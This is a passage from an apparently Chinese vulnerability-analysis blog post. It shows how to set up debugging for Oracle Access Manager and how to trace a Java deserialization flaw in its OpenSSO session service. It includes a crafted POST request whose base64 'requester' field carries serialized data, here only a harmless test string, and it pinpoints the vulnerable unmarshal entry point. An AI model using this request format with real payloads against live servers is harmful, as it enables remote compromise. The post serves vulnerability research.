</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms bash -c <span style=color:#e6db74>&#34;cd /u01/oracle/wlserver/server/lib &amp;&amp; java -jar /u01/oracle/wlserver/modules/com.bea.core.jarbuilder.jar&#34;</span>
</span></span><span style=display:flex><span>docker cp oamms:/u01/oracle/wlserver/server/lib/wlfullclient.jar .
</span></span></code></pre></td></tr></table></div></div><p>下载coherence依赖包</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-50-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-50-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-50-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-50-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms tar czf /tmp/coherencelib.tgz /u01/oracle/coherence/lib/
</span></span><span style=display:flex><span>docker cp oamms:/tmp/coherencelib.tgz .
</span></span></code></pre></td></tr></table></div></div><p>这就是我们需要的全部依赖包了</p><p><img loading=lazy src=image-20220707102358804.png alt=image-20220707102358804></p><h2 id=开始调试>⑥开始调试<a hidden class=anchor aria-hidden=true href=#开始调试>#</a></h2><p>在本地IDEA中新建一个maven项目</p><p><img loading=lazy src=image-20220322192017778.png alt=image-20220322192017778></p><p>将<code>\oracle\user_projects\domains\access_domain\servers\oam_server1\tmp\_WL_user\oam-jars\gkvqum\APP-INF\lib</code> 、<code>/u01/oracle/coherence/lib/</code> 和 <code>wlfullclient.jar</code> 三个依赖添加到LIB。</p><p><img loading=lazy src=image-20220322192105477.png alt=image-20220322192105477></p><p>然后添加一个Remote Tomcat进行调试</p><p><img loading=lazy src=image-20220322192158100.png alt=image-20220322192158100></p><p><img loading=lazy src=image-20220322192149683.png alt=image-20220322192149683></p><p>在<code>openssoproxy.jar</code> 包的函数<code>oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent#isRequesterSessionID</code> 中下断点，发送步骤③所举例的基本请求。能够成功在断点处中止运行。</p><p><img loading=lazy src=image-20220322192317081.png alt=image-20220322192317081></p><p>至此已经可以调试oamms了。</p><h1 id=调试分析>调试分析<a hidden class=anchor aria-hidden=true href=#调试分析>#</a></h1><h3 id=反序列化入口>反序列化入口<a hidden class=anchor aria-hidden=true href=#反序列化入口>#</a></h3><p>参考前述报错调用栈和漏洞作者分析文章</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;Mar 22, 2022 2:33:02,196 AM GMT&gt; &lt;Warning&gt; &lt;oracle.oam.binding&gt; &lt;BEA-000000&gt; &lt;Error while processing Master Controller in PBL
</span></span><span style=display:flex><span>java.lang.NullPointerException
</span></span><span style=display:flex><span>★  at oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent.isRequesterSessionID(OpenssoCheckValidSessionEvent.java:58)
</span></span><span style=display:flex><span>	at oracle.security.am.proxy.opensso.controller.OpenssoFlowController.getNextEventHint(OpenssoFlowController.java:515)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getEventHint(AbstractEventFlowController.java:193)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getSuccessFailEvent(AbstractEventFlowController.java:158)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getNextEvent(AbstractEventFlowController.java:99)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.getNextEvent(MasterController.java:236)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processEvent(MasterController.java:615)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.process(MasterController.java:708)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)
</span></span><span style=display:flex><span>★  at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)
</span></span><span style=display:flex><span>……
</span></span></code></pre></td></tr></table></div></div><p>在<code>oracle.security.am.pbl.transport.http.AMServlet.doPost</code> 和 <code>oracle.security.am.pbl.PBLFlowManager#handleBaseEvent</code> 附近下断点，发送以下请求</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 338
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;b2JqZWN0OnJPMEFCWFFBRUdobGJHeHZJR3BoZG1GdlltcGxZM1E9&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>其中requester参数值为序列化数据加上<code>object:</code>前缀的base64编码后数据。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-53-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-53-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-53-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-53-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo b2JqZWN0OnJPMEFCWFFBRUdobGJHeHZJR3BoZG1GdlltcGxZM1E9 | base64 -d
</span></span><span style=display:flex><span>object:rO0ABXQAEGhlbGxvIGphdmFvYmplY3Q<span style=color:#f92672>=</span>
</span></span></code></pre></td></tr></table></div></div><p>跟踪调试，到此处 <code>oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal</code> 传入的<code>requester</code>参数对应的数据被反序列化。</p><p><img loading=lazy src=image-20220323101521761.png alt=image-20220323101521761></p><p>至此我们确定了反序列化的入口点是在 <code>oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal</code> 。</p><p>反序列化开始前的完整调用栈</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-50>50</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>unmarshal:2439, OpenssoEngineController (oracle.security.am.proxy.opensso.controller)
</span></span><span style=display:flex><span>processEvent:1069, OpenssoEngineController (oracle.security.am.proxy.opensso.controller)
</span></span><span style=display:flex><span>processEvent:596, MasterController (oracle.security.am.controller)
</span></span><span style=display:flex><span>processRequest:788, MasterController (oracle.security.am.controller)
</span></span><span style=display:flex><span>process:708, MasterController (oracle.security.am.controller)
</span></span><span style=display:flex><span>delegateToMasterController:221, PBLFlowManager (oracle.security.am.pbl)
</span></span><span style=display:flex><span>handleBaseEvent:147, PBLFlowManager (oracle.security.am.pbl)
</span></span><span style=display:flex><span>processRequest:107, PBLFlowManager (oracle.security.am.pbl)
</span></span><span style=display:flex><span>handleRequest:221, AMServlet (oracle.security.am.pbl.transport.http)
